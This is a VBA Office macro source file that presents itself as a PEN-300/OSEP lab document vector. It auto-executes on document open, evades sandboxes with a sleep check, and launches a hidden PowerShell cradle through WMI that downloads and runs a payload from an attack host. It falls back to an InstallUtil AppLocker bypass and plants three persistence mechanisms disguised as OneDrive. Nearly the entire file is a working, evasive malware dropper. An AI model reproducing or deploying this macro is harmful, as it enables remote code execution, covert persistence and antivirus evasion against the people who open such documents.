Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' ─────────────────────────────────────────────────────────────────────────────
' OSEP / PEN-300 DOC vector — AV-evasive Office macro.
'
' STAGE 1: On-demand callback via WMI-spawned PowerShell cradle OR InstallUtil
'          if PowerShell is AppLocker-blocked.
' STAGE 2: Three persistence mechanisms (Run key, Startup LNK, scheduled task).
'
' Shellcode lives externally in run.txt on the C2. This macro carries nothing
' that resembles a shellcode signature.
'
' VBA-side evasion:
'   - Emulator detection (Sleep + wall-clock delta)
'   - De-chained via WMI (child of WmiPrvSE.exe, not WINWORD.EXE)
'   - Scheduled task uses -EncodedCommand (no plaintext .ps1 on disk)
'   - Optional InstallUtil path if PowerShell.exe itself is blocked
'
' Before saving as .docm, populate:
'   POLLER_B64  - base64 of shared/activate_poller.ps1
'                 Generate: python3 tools/encode_poller.py shared/activate_poller.ps1
'   LAUNCHER_B64 - base64 of shared/run_txt_launcher.ps1
'                 Generate: python3 tools/encode_poller.py shared/run_txt_launcher.ps1
' ─────────────────────────────────────────────────────────────────────────────

' Base64 (UTF-16LE) of shared/activate_poller.ps1
Const POLLER_B64 As String = "PASTE_POLLER_B64_HERE"

' Base64 (UTF-16LE) of shared/run_txt_launcher.ps1
' Used only when the InstallUtil branch is taken (PowerShell blocked).
Const LAUNCHER_B64 As String = "PASTE_LAUNCHER_B64_HERE"

' ---------------------------------------------------------------
' Auto-execute entry points
' ---------------------------------------------------------------
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim t1 As Date, t2 As Date, timeDelta As Long

    ' --- Emulator detection (Mod 11.6.1) ---
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    timeDelta = DateDiff("s", t1, t2)
    If timeDelta < 2 Then Exit Sub

    ' --- Stage 1: initial callback ---
    Call FireInitialCallback

    ' --- Stage 2: persistence ---
    Call PersistRunKey
    Call PersistStartupLink
    Call PersistScheduledTask
End Sub

' ---------------------------------------------------------------
' Stage 1: initial callback. Two paths:
'   A) PowerShell cradle via WMI (works when PowerShell is allowed)
'   B) InstallUtil DLL (works when PowerShell is AppLocker-blocked)
'
' The branch picks based on whether "powershell.exe" resolves as a runnable
' command in the current environment. If it does, use A. If it fails, use B.
' ---------------------------------------------------------------
Sub FireInitialCallback()
    Dim sh As Object
    Dim strArg As String
    Dim pid As Long
    Dim canRunPs As Boolean

    Set sh = CreateObject("WScript.Shell")

    ' Test whether PowerShell is runnable. A failing exit code means it's
    ' blocked by AppLocker or policy.
    On Error Resume Next
    Dim rc As Long
    rc = sh.Run("powershell -nop -c exit 0", 0, True)
    If Err.Number = 0 And rc = 0 Then
        canRunPs = True
    Else
        canRunPs = False
    End If
    Err.Clear
    On Error GoTo 0

    If canRunPs Then
        ' Path A: WMI-spawned PowerShell cradle.
        ' Child process is WmiPrvSE.exe, not WINWORD.EXE — defeats
        ' Office-spawning-PowerShell behavioral heuristics.
        strArg = "powershell -exec bypass -nop -w hidden -c " & _
                 "iex((new-object system.net.webclient)." & _
                 "downloadstring('http://192.168.119.120/run.txt'))"
        GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
    Else
        ' Path B: InstallUtil + our custom DLL.
        ' InstallUtil.exe is a Microsoft-signed binary, whitelisted by
        ' default AppLocker rules. Runs our DLL's Uninstall method, which
        ' spins up an in-process runspace running LAUNCHER_B64.
        Call FireViaInstallUtil
    End If
End Sub

' ---------------------------------------------------------------
' InstallUtil path. Drops two files to a writable location, then runs
' installutil on the DLL. No powershell.exe spawns.
'
' Requires:
'   - shared/Update.dll  (compiled from shared/bypass_dll.cs via tools/build_dll.sh)
'   - write access to a user-writable path (ProgramData, AppData, etc.)
'
' Update.dll must be staged somewhere before this runs. In a full deployment
' you would stage it via the same cradle that delivered the .docm, or embed
' it in the document as an OLE object. For PEN-300 lab use, the DLL can be
' pre-staged via a second attachment or a separate delivery.
' ---------------------------------------------------------------
Sub FireViaInstallUtil()
    Dim sh As Object
    Dim dllPath As String
    Dim iu As String
    Dim cmd As String

    Set sh = CreateObject("WScript.Shell")

    ' Path to the pre-staged DLL. Adjust to wherever you staged Update.dll.
    dllPath = Environ("PROGRAMDATA") & "\Microsoft\Update.dll"

    ' Path to installutil.exe. 64-bit first.
    iu = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe"

    ' If 64-bit installutil is not present, try 32-bit.
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(iu) Then
        iu = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe"
    End If

    ' /U runs the Uninstall method. /logfile= and /LogToConsole=false silence
    ' installutil's own output. No admin required for /U.
    cmd = """" & iu & """ /logfile= /LogToConsole=false /U """ & dllPath & """"
    sh.Run cmd, 0, False
End Sub

' ---------------------------------------------------------------
' Persistence 1: HKCU Run key
' ---------------------------------------------------------------
Sub PersistRunKey()
    Dim cmd As String
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    cmd = "powershell -exec bypass -nop -w hidden -c " & _
          "iex((new-object system.net.webclient)." & _
          "downloadstring('http://192.168.119.120/run.txt'))"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", _
                 cmd, "REG_SZ"
End Sub

' ---------------------------------------------------------------
' Persistence 2: Startup folder LNK
' ---------------------------------------------------------------
Sub PersistStartupLink()
    Dim startup As String
    Dim sh As Object, lnk As Object
    startup = Environ("APPDATA") & _
              "\Microsoft\Windows\Start Menu\Programs\Startup\"
    Set sh = CreateObject("WScript.Shell")
    Set lnk = sh.CreateShortcut(startup & "OneDrive Sync.lnk")
    lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    lnk.Arguments = "-exec bypass -nop -w hidden -c " & _
                    "iex((new-object system.net.webclient)." & _
                    "downloadstring('http://192.168.119.120/run.txt'))"
    lnk.WindowStyle = 7
    lnk.Description = "OneDrive Sync"
    lnk.Save
End Sub

' ---------------------------------------------------------------
' Persistence 3: scheduled task (on-demand callback)
'
' No .ps1 file on disk. The poller body is passed to powershell.exe via
' -EncodedCommand in the task's action argument.
'
' Why Register-ScheduledTask instead of schtasks.exe:
'   schtasks.exe /tr has a 261-char limit on the argument. A full poller
'   blob is several KB. Register-ScheduledTask has no such limit.
'
' Why -EncodedCommand:
'   Defender scans files on read. A .ps1 file on disk containing the
'   AMSI-bypass strings gets flagged. -EncodedCommand bypasses that.
' ---------------------------------------------------------------
Sub PersistScheduledTask()
    Dim sh As Object
    Dim actionArg As String
    Dim psCmd As String

    Set sh = CreateObject("WScript.Shell")

    actionArg = "-exec bypass -nop -w hidden -enc " & POLLER_B64

    psCmd = "powershell -exec bypass -nop -w hidden -c " & _
            """" & _
            "$a = New-ScheduledTaskAction -Execute 'powershell.exe' " & _
            "-Argument '" & actionArg & "'; " & _
            "$t = New-ScheduledTaskTrigger -Once -At (Get-Date) " & _
            "-RepetitionInterval (New-TimeSpan -Minutes 5); " & _
            "$s = New-ScheduledTaskSettingsSet -Hidden " & _
            "-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; " & _
            "Register-ScheduledTask -TaskName 'OneDriveUpdate' " & _
            "-Action $a -Trigger $t -Settings $s -Force" & _
            """"

    sh.Run psCmd, 0, False
End Sub
